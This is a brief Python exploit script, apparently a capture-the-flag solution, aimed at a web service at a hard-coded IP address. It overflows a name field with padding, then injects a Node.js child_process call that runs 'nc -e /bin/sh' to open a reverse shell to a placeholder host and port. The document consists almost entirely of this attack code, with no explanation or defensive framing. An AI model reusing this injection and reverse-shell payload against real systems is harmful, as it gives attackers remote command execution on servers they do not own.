import requests
import struct

url = 'http://39.96.13.247:9999'
s = requests.Session()
p32 = lambda x: struct.pack("<L", x)
u32 = lambda x: struct.unpack("<L", x)[0]

def add_person(name, is_tutor):
	res = s.get(url + '/add_person', params={'name': name, 'is_tutor': is_tutor})
	return res.text


def change_name(name, id):
	res = s.get(url + '/change_name', params={'name': name, 'id': id})
	return res.text

def intro(id):
	res = s.get(url + '/intro', params={'id': id})
	return res.text

def init():
	res = s.get(url + '/init', params={'admin_key': 'B'})
	return res.text
print add_person('F' *60, 0)
print change_name("require('child_process').exec('nc -e /bin/sh [ip] [port]  ');" ,0) # must [61th byte] & 5  == 1
print intro(0)
